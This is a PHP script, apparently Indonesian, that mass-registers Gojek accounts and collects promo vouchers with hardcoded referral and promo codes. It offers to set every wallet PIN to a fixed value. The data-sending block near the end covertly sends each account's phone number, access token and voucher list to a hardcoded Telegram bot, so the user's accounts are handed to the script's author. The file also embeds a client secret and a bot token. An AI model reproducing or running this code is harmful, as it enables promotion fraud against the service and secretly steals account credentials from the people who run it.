<?php
date_default_timezone_set('Asia/Jakarta');
include "janda.php";
ulang:
// function change(){
        echo color("red"," 💗sabar ya jandaku💗 \n");
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("white"," 🔹NOMOR: ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("yellow"," 🔹minta otp")."\n";
        otp:
        echo color("white"," 🔹OTP  : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("white","sukses\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        sleep(1);
        echo "\n".color("yellow"," 🔹Nama : ".$nama.".");
        sleep(1);
        echo "\n".color("yellow"," 🔹Email: ".$email."@gmail.com");
        sleep(1);
        echo color("white","\n 🔹Get code..");
        echo "\n".color("blue"," 🔹Voucher1");
        echo "\n".color("white"," 🔹Tunggu");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(5);
        }
        $code1 = request('/customer_referrals/v1/campaign/enrolment', $token, '{"referral_code":"G-S52NDYW"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'sukses')){
        echo "\n".color("green","Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("white"," Message: ".$message);
	gocar:
        echo "\n".color("blue"," 🔹Voucher2. ");
        echo "\n".color("white"," 🔹Tunggu ");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(15);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2107"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'sukses')){
        echo "\n".color("green","Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("white"," Message: ".$message);
        gofood:
        echo "\n".color("blue"," 🔹Voucher3.");
        echo "\n".color("white"," 🔹Tunggu");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(5);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2107"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("white"," Message: ".$message);
        echo "\n".color("blue"," 🔹Voucher4.");
        echo "\n".color("white"," 🔹Tunggu");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(5);
        }
        sleep(3);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EMPAT"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("white"," Message: ".$messageboba09);
        sleep(1);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        
        echo "\n".color("blue"," Voucher ada ".$total." : ");
        echo "\n".color("red"," 1.        ".$voucher1);
        echo "\n".color("white"," sampai:   ".$expired1);
        echo "\n".color("yellow"," 2.        ".$voucher2);
        echo "\n".color("white"," sampai:   ".$expired2);
        echo "\n".color("green"," 3.        ".$voucher3);
        echo "\n".color("white"," sampai:   ".$expired3);
        
        echo "\n".color("blue"," 4.        ".$voucher4);
        echo "\n".color("white"," sampai:   ".$expired4);
        echo "\n".color("purple"," 5.        ".$voucher5);
	echo "\n".color("white"," sampai:   ".$expired5);
        echo "\n".color("nevy"," 6.        ".$voucher6);
        echo "\n".color("white"," sampai:   ".$expired6);
        echo "\n".color("grey"," 7.        ".$voucher7);
        echo "\n".color("white"," sampai:   ".$expired7);
        echo "\n".color("red"," 8.        ".$voucher8);
        echo "\n".color("white"," sampai:   ".$expired8);
        echo "\n".color("yellow"," 9.        ".$voucher9);
        echo "\n".color("white"," sampai:   ".$expired9);
        echo "\n".color("green","10.       ".$voucher10);
        echo "\n".color("white"," sampai:  ".$expired10);
        echo "\n".color("blue","11.       ".$voucher11);
        echo "\n".color("white"," sampai:  ".$expired11);
	echo "\n".color("purple","12.       ".$voucher12);
        echo "\n".color("white"," sampai:  ".$expired13);
        echo "\n".color("grey","13.       ".$voucher13);
        echo color("nevy"," Token e Janda: ".$token."\n\n");
        echo"\n";
        $TOKEN  = "1255177018:AAEvsNT6IRAg6NUF8TxJIgfBuMk1ljP0V3A";
	$chatid = "901308103";
	$pesan 	= "[+] Gojek Account Info [+]\n\n".$hp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("white","SETPIN..!!!: y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("white","PIN MU = 696969 ")."\n";
         $data2 = '{"pin":"696969"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("white"," GAGAL!!!\n");
         }
         }
         }
         }else{
         echo color("white","0TP KLIRU");
         echo"\n💔💔💔💔\n";
         echo color("red","Ulang..\n");
         goto otp;
         }
         }else{
         echo color("white","Ganti.");
         echo"\n💔💔💔💔\n";
         echo color("yellow"," Sudah Jadi Janda..\n");
         goto ulang;
         }
//  }

// echo change()."\n";
